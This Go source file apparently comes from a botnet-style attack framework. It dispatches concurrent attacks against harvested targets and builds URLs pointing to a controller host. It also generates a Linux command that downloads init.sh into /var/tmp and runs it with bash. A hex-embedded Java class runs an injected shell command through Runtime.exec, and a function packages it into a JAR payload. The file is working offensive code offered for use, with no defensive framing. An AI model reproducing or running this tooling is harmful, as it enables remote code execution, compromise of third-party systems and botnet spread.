package attack

import (
	"encoding/hex"
	"fmt"
	"github.com/cbot/targets/local"
	"github.com/cbot/targets/source"
	"github.com/cbot/utils/fileutils"
	"github.com/cbot/utils/netutils"
	"os"
	"path/filepath"
	"strings"
	"sync"
)


const (

	JarAttackPayloadBefore = `CAFEBABE00000034004E0A001500260700270A000200260A002800290A0028002A0A002B002C07002D07002E0A002B002F0A000800300A000700310A000700320A000200330800340700350A000F00360A000200370800380A0014003907003A07003B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C6501000E65786563757465436F6D6D616E64010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B01000D537461636B4D61705461626C6507002707003C07002D0700350100046D61696E010016285B4C6A6176612F6C616E672F537472696E673B295601000A457863657074696F6E7301000A536F7572636546696C6501000C4A61724D61696E2E6A6176610C001600170100176A6176612F6C616E672F537472696E674275696C64657207003D0C003E003F0C0040004107003C0C004200430100166A6176612F696F2F42756666657265645265616465720100196A6176612F696F2F496E70757453747265616D5265616465720C004400450C001600460C001600470C004800490C004A004B0100010A0100136A6176612F6C616E672F457863657074696F6E0C004C00490C004D004901`
	JarAttackPayloadAfter  = `0C001A001B0100074A61724D61696E0100106A6176612F6C616E672F4F626A6563740100116A6176612F6C616E672F50726F636573730100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B01000777616974466F7201000328294901000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B2956010013284C6A6176612F696F2F5265616465723B2956010008726561644C696E6501001428294C6A6176612F6C616E672F537472696E673B010006617070656E6401002D284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E674275696C6465723B01000A6765744D657373616765010008746F537472696E67002100140015000000000003000100160017000100180000001D00010001000000052AB70001B100000001001900000006000100000003000A001A001B00010018000000AF000500050000004FBB000259B700034CB800042AB600054D2CB6000657BB000759BB0008592CB60009B7000AB7000B4E2DB6000C593A04C600122B1904B6000D120EB6000D57A7FFEAA700094D2CB60010B02BB60011B00001000800410044000F000200190000002A000A000000070008000A0010000B0015000C0028000F00320010004100140044001200450013004A0016001C000000160004FE002807001D07001E07001FF900184207002005000900210022000200180000002300010001000000071212B8001357B10000000100190000000A00020000001B0006001D0023000000040001000F00010024000000020025`

	JarMetaFileContent = `Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Build-Jdk: 1.8.0_261
Main-Class: JarMain`
	)

type AttackTasks struct {

	lock sync.Mutex

	Cfg *Config

	spool *source.SourcePool

	nodeInfo *local.NodeInfo

	attacks map[string]Attack

	syncChan chan int

	attackProcessChan chan *AttackProcess
}

func NewAttackTasks(cfg *Config, nodeInfo *local.NodeInfo, spool *source.SourcePool) *AttackTasks {

	return &AttackTasks{
		lock:              sync.Mutex{},
		Cfg:               cfg,
		spool:             spool,
		nodeInfo:          nodeInfo,
		attacks:           make(map[string]Attack),
		syncChan:          make(chan int, cfg.MaxThreads),
		attackProcessChan: make(chan *AttackProcess, cfg.AttackProcessCapacity),
	}

}

func (at *AttackTasks) AddAttack(attack Attack) {

	at.lock.Lock()
	defer at.lock.Unlock()

	if _, ok := at.attacks[attack.Name()]; !ok {

		//no existed

		at.attacks[attack.Name()] = attack
	}

}

func (at *AttackTasks) RemoveAttack(name string) {

	at.lock.Lock()
	defer at.lock.Unlock()

	delete(at.attacks, name)

}

func (at *AttackTasks) SubAttackProcess() chan *AttackProcess {

	return at.attackProcessChan
}

func (at *AttackTasks) PubAttackProcess(process *AttackProcess) {

	at.attackProcessChan <- process

}

func (at *AttackTasks) run(target source.Target) {

	at.lock.Lock()
	defer at.lock.Unlock()

	for _, attack := range at.attacks {

		if attack.Accept(target) {

			//log.Printf("Try to Attack for target,attack.name:%s",attack.Name())

			//try to run,if too many threads is live than wait some threads exit
			at.PubSyn()
			//ok
			go attack.Run(target)
		}
	}
}

func (at *AttackTasks) PubSyn() {

	at.syncChan <- 1

}

func (at *AttackTasks) PubUnSyn() {

	<-at.syncChan
}

func (at *AttackTasks) Start() {

	targetChan := at.spool.SubTarget("attack_tasks", at.Cfg.SourceCapacity, func(target source.Target) bool {

		for _, attack := range at.attacks {

			if attack.Accept(target) {

				return true
			}
		}
		return false
	})

	go func() {
		for {

			select {

			case target := <-targetChan:

				//log.Printf("Receive a attack target:%s",jsonutils.ToJsonString(target,true))
				at.run(target)

			}
		}
	}()
}

func (at *AttackTasks) DownloadInitUrl(targetIP string, targetPort int, attackType string, fname string) string {

	upc := &netutils.URLPathCrypt{
		TaskId:       at.Cfg.TaskId,
		NodeId:       at.Cfg.NodeId,
		Fname:        fname,
		AttackType:   attackType,
		AttackIP:     at.nodeInfo.IP,
		TargetIP:     targetIP,
		TargetPort:   targetPort,
		DownloadTool: "wget",
	}

	return fmt.Sprintf("http://%s:%d/%s", at.Cfg.SBotHost, at.Cfg.SBotPort, netutils.URLPathCryptToString(upc))

}

func (at *AttackTasks) InitCmdForLinux(initUrl string,attackType string) string {

	return fmt.Sprintf("wget %s -q -O /var/tmp/init.sh;bash /var/tmp/init.sh %s %s", initUrl, at.Cfg.NodeId,attackType)
}

func getHexCmdLen(cmd string ) string {

	n := len(cmd)

	if n == 0 {
		return "0000"
	}

	hexStr := fmt.Sprintf("%X",n)

	switch len(hexStr) {

	case 4:
		return hexStr

	case 3:
		return "0"+hexStr

	case 2:
		return "00"+hexStr

	case 1:
		return "000"+hexStr

	default:
		return "0000"
	}

}

func (at *AttackTasks) MakeJarAttackPayload(cmd string) (string,error) {

	cmdHex := strings.ToLower(hex.EncodeToString([]byte(cmd)))
	cmdLenHex := getHexCmdLen(cmd)

	jarPayloadHexString := fmt.Sprintf("%s%s%s%s",JarAttackPayloadBefore,cmdLenHex,cmdHex,JarAttackPayloadAfter)

	jarFilePath := filepath.Join(os.TempDir(),"JarMain.class")

	jdata,err := hex.DecodeString(jarPayloadHexString)
	if err!=nil {
		return "",err
	}

	if err=fileutils.WriteFile(jarFilePath,jdata) ;err!=nil {

		return "",err
	}

	metaFile := filepath.Join(os.TempDir(),"META-INF","MANIFEST.MF")
	os.MkdirAll(filepath.Join(os.TempDir(),"META-INF"),0755)

	if err = fileutils.WriteFile(metaFile,[]byte(JarMetaFileContent));err!=nil {

		return "",err
	}

	jarPackagePath := filepath.Join(os.TempDir(),"JarMain.jar")

	if err = fileutils.ZipFiles(jarPackagePath,os.TempDir(),[]string{jarFilePath,metaFile},true);err!=nil {

		return "",err
	}

	return jarPackagePath,nil
}

func (at *AttackTasks) GetNodeIP()string {

	return at.nodeInfo.IP
}
